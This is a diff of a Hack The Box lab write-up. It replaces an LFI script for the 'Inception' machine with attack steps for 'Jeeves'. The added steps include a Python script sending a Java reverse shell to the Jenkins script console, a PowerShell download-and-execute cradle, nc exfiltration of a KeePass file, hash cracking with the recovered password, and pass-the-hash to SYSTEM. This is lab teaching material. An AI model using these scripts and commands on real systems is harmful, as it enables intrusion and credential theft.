+import argparse
 
-def getBase64(text):
-    output = text.split(" ")
-    for x in output:
-        if "[(" in x:
-            base64_text = x.replace("[(","").replace(")]","")
-            decoded_text = base64.b64decode(base64_text).decode('utf-8')
-            return decoded_text
+def checkrce(url):
+    url = url + "/script"
+    r = requests.get(url)
+    if r.status_code == 200:
+        return True
+    else:
+        return False
 
-def exploit(url, filename):
-    try:
-        url = url + filename
-        r = requests.get(url)
-        data = str(r.text)
-        output = data.split("\n")
-        for x in output:
-            if "Tf" in x:
-                return getBase64(x)
-            else:
-                continue
-    except:
-        return None
-
-def main(url):
-    filenames = open("lfi.txt").readlines()
-    number = 0
-    for filename in filenames:
-        filename = filename.strip()
-        decoded_text = exploit(url, filename)
-        if decoded_text is None:
-            continue
-        outputfilename = "files/{number}".format(number=str(number))
-        outputfile = open(outputfilename,'a')
-        outputfile.write(filename)
-        outputfile.write("\n")
-        outputfile.write(decoded_text)
-        print("[*] {filename} saved to {outputfilename}".format(filename=filename,outputfilename=outputfilename))
-        number += 1
-        outputfile.close()
+def reverseshell(url, ip, port, crumbs):
+    url = url + "/script"
+    script_payload ='String host="str_ip_address";int port=str_port;String os="cmd.exe";Process p=new ProcessBuilder(os).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();'.replace("str_ip_address", str(ip)).replace("str_port", str(port))
+    print("[+] Reverse Shell payload used: {payload}".format(payload=script_payload))
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded"
+    }
+    data = {
+        "script": script_payload,
+        "Jenkins-Crumb": crumbs,
+        "Submit": "Run"
+    }
+    r = requests.post(url, data=data, headers=headers, timeout=10)
+    
+def main(url, ip, port, crumbs):
+    if checkrce(url) == True:
+        print("[+] Spawning reverse shell connection on {ip}:{port}".format(ip=ip, port=port))
+        try:
+            reverseshell(url, ip, port, crumbs)
+        except:
+            pass
+    else:
+        print("[!] {url} cannot be exploited".format(url=url))
 
 if __name__ == '__main__':
-    url = "http://inception.htb/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource="
-    main(url)
+    parser = argparse.ArgumentParser()
+    parser.add_argument('-u', '--url', help="Vulnerable URL")
+    parser.add_argument('-c', '--crumb', help="String value of Jenkins-Crumb")
+    parser.add_argument('-i','--ip', help="IP Address of listening connection/lhost")
+    parser.add_argument('-p','--port', help="Port Number of listening connection/lport")
+    args=parser.parse_args()
+    main(args.url, str(args.ip), str(args.port), args.crumb)
 ```
 
-### Verifying that we are in a container
-Using the ```ls -la``` command, we are unable to find a .dockerenv file that tells us that we are in a container
+Executing the following command will create a reverse shell connection to our local machine
+
+```bash
+python3 jenkins_reverse.py -u "http://jeeves.htb:50000/askjeeves" -c "9f3ab776a72cd71c3f2923a902f8df3a" -i "10.10.16.6" -p "4000"
+```
+### Jenkins CLI
+Navigating to http://jeeves.htb:50000/askjeeves/cli/, we are able to download the CLI and interact with the Jenkins service. For example, we can use the CLI to check the Jenkins version that is being used. From the output, we can see that the version being used is 2.87
 
 ```
-root@Inception:/# ls -la
-total 68
-drwxr-xr-x  21 root   root    4096 Nov  1  2017 .
-drwxr-xr-x  21 root   root    4096 Nov  1  2017 ..
-drwxr-xr-x   2 root   root    4096 Nov  6  2017 bin
-drwxr-xr-x   2 root   root    4096 Apr 12  2016 boot
-drwxr-xr-x   9 root   root     500 May 27 02:15 dev
-drwxr-xr-x  75 root   root    4096 Nov  6  2017 etc
-drwxr-xr-x   3 root   root    4096 Nov  6  2017 home
-drwxr-xr-x  11 root   root    4096 Oct 27  2017 lib
-drwxr-xr-x   2 root   root    4096 Oct 27  2017 lib64
-drwxr-xr-x   2 root   root    4096 Oct 27  2017 media
-drwxr-xr-x   2 root   root    4096 Oct 27  2017 mnt
-drwxr-xr-x   2 root   root    4096 Oct 27  2017 opt
-dr-xr-xr-x 199 nobody nogroup    0 May 27 02:15 proc
-drwx------   2 root   root    4096 Nov  8  2017 root
-drwxr-xr-x  16 root   root     520 May 27 02:19 run
-drwxr-xr-x   2 root   root    4096 Nov  6  2017 sbin
-drwxr-xr-x   2 root   root    4096 Nov  6  2017 srv
-dr-xr-xr-x  13 nobody nogroup    0 May 27 02:25 sys
-drwxrwxrwt   7 root   root    4096 May 27 02:17 tmp
-drwxr-xr-x  10 root   root    4096 Oct 27  2017 usr
-drwxr-xr-x  12 root   root    4096 Nov  6  2017 var
+┌──(kali㉿kali)-[~/Desktop/jeeves]
+└─$ java -jar jenkins-cli.jar -s http://jeeves.htb:50000/askjeeves/ version
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+2.87
 ```
 
-Furthurmore, using ```hostname``` only tells us that the container's name is Inception and does not reveal anymore information.
+Using the CLI, we can also see that we are currently authenticated as anonymous
 
 ```
-root@Inception:/# hostname
-Inception
-root@Inception:/# 
+┌──(kali㉿kali)-[~/Desktop/jeeves]
+└─$ java -jar jenkins-cli.jar -s http://jeeves.htb:50000/askjeeves/ who-am-i                       2 ⨯
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Authenticated as: anonymous
+Authorities:
 ```
 
-However, using ```ifconfig``` reveals an IP address(192.168.0.10) that is different from the IP address of this machine. This tells us that we are in a container.
+According to the documentation, we can also use a Groovy shell to execute remote commands. However, I was unable to get it to work on my local machine as it always hangs whenever I try to execute commands on it
 
 ```
-root@Inception:/# ifconfig
-eth0      Link encap:Ethernet  HWaddr 00:16:3e:28:53:63  
-          inet addr:192.168.0.10  Bcast:192.168.0.255  Mask:255.255.255.0
-          inet6 addr: fe80::216:3eff:fe28:5363/64 Scope:Link
-          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
-          RX packets:1092 errors:0 dropped:0 overruns:0 frame:0
-          TX packets:743 errors:0 dropped:0 overruns:0 carrier:0
-          collisions:0 txqueuelen:1000 
-          RX bytes:94446 (94.4 KB)  TX bytes:102417 (102.4 KB)
+┌──(kali㉿kali)-[~/Desktop/jeeves]
+└─$ java -jar jenkins-cli.jar -s http://jeeves.htb:50000/askjeeves/ groovysh                       5 ⨯
+Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+Groovy Shell (2.4.11, JVM: 1.8.0_151)
+Type ':help' or ':h' for help.
+-------------------------------------------------------------------------------
+groovy:000> import jenkins.model.Jenkins
 
-lo        Link encap:Local Loopback  
-          inet addr:127.0.0.1  Mask:255.0.0.0
-          inet6 addr: ::1/128 Scope:Host
-          UP LOOPBACK RUNNING  MTU:65536  Metric:1
-          RX packets:1988 errors:0 dropped:0 overruns:0 frame:0
-          TX packets:1988 errors:0 dropped:0 overruns:0 carrier:0
-          collisions:0 txqueuelen:1 
-          RX bytes:182647 (182.6 KB)  TX bytes:182647 (182.6 KB)
 
+
+```
+### Exploiting modifiable service files
+
+Looking at the output of PowerUp.ps1 script, we realize that we might be able to exploit a modifiable service binary. 
+```
+ServiceName                     : jenkins
+Path                            : "C:\Users\Administrator\.jenkins\jenkins.exe"
+ModifiableFile                  : C:\Users\Administrator\.jenkins\jenkins.exe
+ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+ModifiableFileIdentityReference : JEEVES\kohsuke
+StartName                       : .\kohsuke
+AbuseFunction                   : Install-ServiceBinary -Name 'jenkins'
+CanRestart                      : False
+Name                            : jenkins
+Check                           : Modifiable Service Files
+```
+However, executing the ```Install-ServiceBinary``` command, we realize that the jeeves\kohsuke might not have the required privileges to modify the service binary.
+
+```
+C:\temp>powershell.exe -c IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6:3000/PowerUp.ps1');Install-ServiceBinary -Name 'Jenkins' -Command 'whoami'
+powershell.exe -c IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6:3000/PowerUp.ps1');Install-ServiceBinary -Name 'Jenkins' -Command 'whoami'
+Service binary '"C:\Users\Administrator\.jenkins\jenkins.exe"' for service jenkins not modifiable by the current user.
+At line:2845 char:13
++             throw "Service binary '$($ServiceDetails.PathName)' for s ...
++             ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : OperationStopped: (Service binary ...e current user.:String) [], RuntimeException
+    + FullyQualifiedErrorId : Service binary '"C:\Users\Administrator\.jenkins\jenkins.exe"' for service jenkins not m 
+   odifiable by the current user.
+```
+
+### Alternate way of Privilege Escalation using kdbx files
+Enumerating the directories, we are able to find a CEH.kdbx file in the C:\Users\kohsuke\Documents directory. With some research, we realize that this is a KeePass database file and might contain database information.
+
+```
+C:\Users\kohsuke\Documents>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is BE50-B1C9
+
+ Directory of C:\Users\kohsuke\Documents
+
+11/03/2017  11:18 PM    <DIR>          .
+11/03/2017  11:18 PM    <DIR>          ..
+09/18/2017  01:43 PM             2,846 CEH.kdbx
+               1 File(s)          2,846 bytes
+               2 Dir(s)   7,453,028,352 bytes free
+```
+
+First what we have to do is to transfer the CEH.kdbx file to our local machine. 
+
+```
+C:\Users\kohsuke\Documents>C:\temp\nc.exe 10.10.16.6 2000 < C:\Users\kohsuke\Documents\CEH.kdbx
+C:\temp\nc.exe 10.10.16.6 2000 < C:\Users\kohsuke\Documents\CEH.kdbx
+------------------------------------------------------------------------------------------------
+┌──(kali㉿kali)-[~/Desktop/jeeves]
+└─$ nc -nlvp 2000
+listening on [any] 2000 ...
+```
+
+Next, we will have to use keepass2john to convert the CEH.kdbx into a hash format that can be cracked using hashcat
+
+```
+┌──(kali㉿kali)-[~/Desktop/jeeves]
+└─$ keepass2john CEH.kdbx > ceh.txt 
+```
+
+However, the hash format that we have obtained cannot be used by hashcat yet. We will need to trim the ```CEH:``` away for the hash to be used by hashcat.
+
+```
+┌──(kali㉿kali)-[~/Desktop/jeeves]
+└─$ cat ceh.txt   
+CEH:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
+
+┌──(kali㉿kali)-[~/Desktop/jeeves]
+└─$ cat ceh_hashcat.txt
+$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
+```
+
+Finally, we will then use hashcat to obtain the password for the database file. From the output, we can find out that the password is ```moonshine1```
+
+```
+┌──(kali㉿kali)-[~/Desktop/jeeves]
+└─$ hashcat -m 13400 ceh_hashcat.txt /home/kali/Desktop/pentest/wordlist/rockyou.txt
+$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48:moonshine1
+```
+
+Next, we will download keepasx to be able to use KeePassX to view the database file. 
+
+```
+sudo apt-get install keepassx
+```
+
+Afterwards, we will open the CEH.kdbx file using KeePassX and authenticate using the credentials that we have found earlier. Looking at the entry for ```Backup Stuff```, we are able to find a hash. 
+![Hash from Backup Stuff](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jeeves/backup.png)
+
+Using the hash, we will try to do a pass-the-hash attack and see if we can authenticate to the windows server.
+
+```
+┌──(kali㉿kali)-[~/Desktop/jeeves]
+└─$ impacket-smbexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 jeeves/Administrator@10.10.10.63
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[!] Launching semi-interactive shell - Careful what you execute
+C:\Windows\system32>whoami
+nt authority\system
+```
+
+Apart from that, we can also use ```impacket-psexec``` to carry out the pass the hash attack. Unfortuantely, executing Pass-The-Hash attack using ```impacket-wmiexec``` times out and we are unable to exploit using ```impacket-wmiexec```
+
+```
+┌──(kali㉿kali)-[~]
+└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 jeeves/Administrator@10.10.10.63
+
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+[*] Requesting shares on 10.10.10.63.....
+[*] Found writable share ADMIN$
+[*] Uploading file eXxiUsJL.exe
+[*] Opening SVCManager on 10.10.10.63.....
+[*] Creating service GNQW on 10.10.10.63.....
+[*] Starting service GNQW.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.10586]
+(c) 2015 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
 ```
